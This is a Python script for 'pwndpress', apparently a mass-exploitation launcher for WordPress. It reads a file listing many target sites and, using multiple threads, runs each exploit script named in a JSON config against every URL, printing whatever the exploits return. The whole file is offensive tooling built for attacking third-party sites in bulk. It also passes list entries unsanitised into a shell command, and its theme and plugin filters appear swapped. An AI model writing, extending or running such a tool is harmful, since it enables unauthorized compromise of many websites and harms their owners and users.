try:
    from fake_useragent import UserAgent
    import requests, re, sys, json, argparse, cloudscraper, subprocess, os
    from multiprocessing.dummy import Pool
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
except:
    print (f'[INFO] pip install -r requirements.txt')

configs = json.load(open('pwndpress.json'))

def themes(line):
    try:
        line = line.split(' ')
        slug = line[0]
        url = line[1]
        
        for config in configs:
            if config['type'] == 'plugin' and config['slug'] not in slug:pass
            else:
                name = config['name']
                print (f'[CHECK] {name} => {url}')
                action = subprocess.getoutput(f'python3 ./{config["file"]} -u {url}')
                if action != '':
                    print (action)
                else:pass
    except Exception as err:
        print ('[ERROR] '+ url)
        pass

def plugins(line):
    try:
        line = line.split(' ')
        slug = line[0]
        url = line[1]
        
        for config in configs:
            if config['type'] == 'theme' and config['slug'] not in slug:pass
            else:
                name = config['name']
                print (f'[CHECK] {name} => {url}')
                action = subprocess.getoutput(f'python3 ./{config["file"]} -u {url}')
                if action != '':
                    print (action)
                else:pass
    except Exception as err:
        print ('[ERROR] '+ url)
        pass 
     
def init():
    banner = '''
    OPTIONS - pwndpress;
    
    1. Exploit Theme
    2. Exploit Plugin
    '''
    try:
        os.system('clear')
    except:
        os.system('cls')
        
    print (banner)
    try:
        sitelist = input(' [?] SITELIST : ')
        urls = open(sitelist, "r", encoding='utf8').read().splitlines()
    except:
        print ('[404] SITELIST NOT FOUND')
        sys.exit()
    
    thread = int(input(' [?] THREAD   : '))
    option = int(input(' [?] OPTION   : '))
        
    try:
        pp = Pool(int(thread))
        if option == 1:
            pp.map(themes, urls)
        elif option == 2:
            pp.map(plugins, urls)
        else:
            print('[ERROR] Invalid Selected Option.')
            sys.exit()
    except:
        print ('[ERROR] Multithread error.')

init()